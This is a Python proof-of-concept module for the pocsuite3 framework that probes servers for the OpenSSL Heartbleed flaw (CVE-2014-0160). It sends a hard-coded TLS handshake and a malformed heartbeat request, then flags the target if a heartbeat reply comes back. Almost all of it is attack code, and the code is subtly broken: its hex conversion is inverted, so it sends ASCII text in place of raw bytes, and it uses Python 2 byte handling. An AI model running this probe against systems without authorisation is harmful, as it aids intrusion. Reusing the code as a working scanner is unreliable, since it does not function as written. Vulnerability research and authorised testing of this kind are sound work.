#!/usr/bin/env python
#_*_ encoding: utf-8 _*_

from pocsuite3.api import Output, POCBase, register_poc, logger
import struct
import socket
import time
import select
import binascii

class HeartBleed(POCBase):
    vulID = '89231'
    version = '1.0'
    author = ['big04dream']
    vulDate = '2015-06-23'
    createDate = '2019-10-11'
    updateDate = '2019-10-11'
    references = ['https://www.seebug.org/vuldb/ssvid-89231']
    name = 'OpenSSL Heartbleed (CVE-2014-0160)'
    appPowerLink = 'https://www.openssl.org/'
    appName = 'openssl'
    appVersion = '1.0.1f, 1.0.1e, 1.0.1d, 1.0.1c, 1.0.1b, 1.0.1a, 1.0.1'
    vulType = 'Buffer overread'
    desc = '''
    OpenSSL Heartbleed 
    '''
    
    def h2bin(self, x):
        tmp = x.replace(' ', '').replace('\n', '')
        return binascii.hexlify(tmp.encode())
    
    @property
    def client_key_exchange(self):
        return self.h2bin('''
            16 03 02 00  dc 01 00 00 d8 03 02 53
            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
            00 0f 00 01 01                                  
        ''')
    
    def get_msg_from_socket(self, some_socket, msg_length, time_out=5):
        end_time = time.time() + time_out
        received_data = b''
        remaining_msg = msg_length
        while remaining_msg > 0:
            read_time = end_time - time.time()
            if read_time < 0:
                return None
            read_socket, write_socket, error_socket = select.select([some_socket], [], [], time_out)
            if some_socket in read_socket:
                data = some_socket.recv(remaining_msg)
                if not data:
                    return None
                else:
                    received_data += data
                    remaining_msg -= len(data)
            else:
                pass
        return received_data
    
    def recv_msg(self, a_socket):
        header = self.get_msg_from_socket(a_socket, 5)
        if header is None:
            return None, None, None
        message_type, message_version, message_length = struct.unpack('>BHH', header)
        message_payload = self.get_msg_from_socket(a_socket, message_length, 10)
        if message_payload is None:
            return None, None, None
        return message_type, message_version, message_payload
    
    def send_n_catch_heartbeat(self, our_socket):
        our_socket.send(self.malformed_heartbeat)
        while True:
            content_type, content_version, content_payload = self.recv_msg(our_socket)
            if content_type is None:
                return False
            if content_type == 24:
                return True
            if content_type == 21:
                return False
    
    @property
    def malformed_heartbeat(self):
        return self.h2bin('''
            18 03 02 00 03
            01 40 00
        ''')
    
    def check_heardbeat(self, host='', port=0):
        local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        local_socket.connect((host, int(port)))
        local_socket.send(self.client_key_exchange)
        while True:
            t, version, payload = self.recv_msg(local_socket)
            if not t:
                return
            if t == 22 and ord(payload[0]) == 0x0E:
                break
        local_socket.send(self.malformed_heartbeat)
        return self.send_n_catch_heartbeat(local_socket)
    
    def _verify(self):
        result = {}
        try:
            host = self.url.split('//')[1]
            port = 443
            if self.check_heardbeat(host=host.encode(), port=port):
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = host
                result['VerifyInfo']['INFO'] = 'target %s vulnerability' % host
        except Exception as e:
            logger.info(e)
        return self.parse_output(result)
        
    
    def _attack(self):
        return self._verify()
    
    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not heartbleed vulnerability')
        return output

register_poc(HeartBleed)